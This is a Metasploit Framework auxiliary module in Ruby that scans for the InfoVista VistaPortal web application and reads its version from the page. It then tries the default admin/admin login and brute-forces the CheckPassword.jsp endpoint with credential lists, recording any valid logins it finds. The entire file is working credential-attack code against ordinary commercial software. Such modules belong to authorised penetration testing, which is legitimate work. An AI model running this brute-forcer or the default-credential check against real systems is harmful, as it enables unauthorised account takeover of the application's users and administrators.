##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'rex/proto/http'
require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::HttpClient
	include Msf::Auxiliary::Report
	include Msf::Auxiliary::AuthBrute
	include Msf::Auxiliary::Scanner

	def initialize(info={})
		super(update_info(info,
			'Name'           => 'InfoVista VistaPortal Application Bruteforce Login Utility',
			'Description'    => %{
				This module attempts to scan for InfoVista VistaPortal Web Application, finds its
			version and performs login brute force to identify valid credentials.
			},
			'Author'         =>
				[
					'Karn Ganeshen <KarnGaneshen[at]gmail.com>',
				],
			'License'        => MSF_LICENSE
		))

		register_options(
			[
				Opt::RPORT(443),
				OptBool.new('SSL', [ true, "Negotiate SSL for outgoing connections", true]),
				OptString.new('TARGETURI', [true, "URI for Web login. Default: /VPortal/mgtconsole/CheckPassword.jsp", "/VPortal/mgtconsole/CheckPassword.jsp"])
			], self.class)
	end

	def run_host(ip)
		unless is_app_infovista?
			print_error("#{rhost}:#{rport} - Application does not appear to be InfoVista VistaPortal. Module will not continue.")
			return
		end

		status = try_default_credential
		return if status == :abort

		print_status("#{rhost}:#{rport} - Brute-forcing...")
		each_user_pass do |user, pass|
			do_login(user, pass)
		end
	end

	#
	# What's the point of running this module if the app actually isn't InfoVista?
	#
	def is_app_infovista?
		res = send_request_cgi(
		{
			'uri'       => '/VPortal/',
			'method'    => 'GET'
		})

		if (res and res.code == 200 and res.body =~ /InfoVista.*VistaPortal/)
			version_key = /PORTAL_VERSION = (.+)./
			version = res.body.scan(version_key).flatten[0].gsub('"','')
			print_good("#{rhost}:#{rport} - Application version is #{version}")
			return true
		else
			return false
		end
	end

	#
	# Test and see if the default credential works
	#
	def try_default_credential
		user = 'admin'
		pass = 'admin'
		do_login(user, pass)
	end

	#
	# Brute-force the login page
	#
	def do_login(user, pass)
		vprint_status("#{rhost}:#{rport} - Trying username:#{user.inspect} with password:#{pass.inspect}")
		begin
			res = send_request_cgi(
			{
				'uri'       => target_uri.to_s,
				'method'    => 'POST',
				'vars_post' =>
					{
						'Login' => user,
						'password' => pass
					}
			})

			if (not res or res.code != 200 or res.body !~ /location.href.*AdminFrame\.jsp/)
				vprint_error("#{rhost}:#{rport} - FAILED LOGIN - #{user.inspect}:#{pass.inspect} with code #{res.code}")
			else
				print_good("#{rhost}:#{rport} - SUCCESSFUL LOGIN - #{user.inspect}:#{pass.inspect}")

				report_hash = {
					:host   => rhost,
					:port   => rport,
					:sname  => 'InfoVista VistaPortal',
					:user   => user,
					:pass   => pass,
					:active => true,
					:type => 'password'
				}

				report_auth_info(report_hash)
				return :next_user
			end

		rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError, ::Errno::EPIPE
			print_error("#{rhost}:#{rport} - HTTP Connection Failed, Aborting")
			return :abort
		end
	end

end
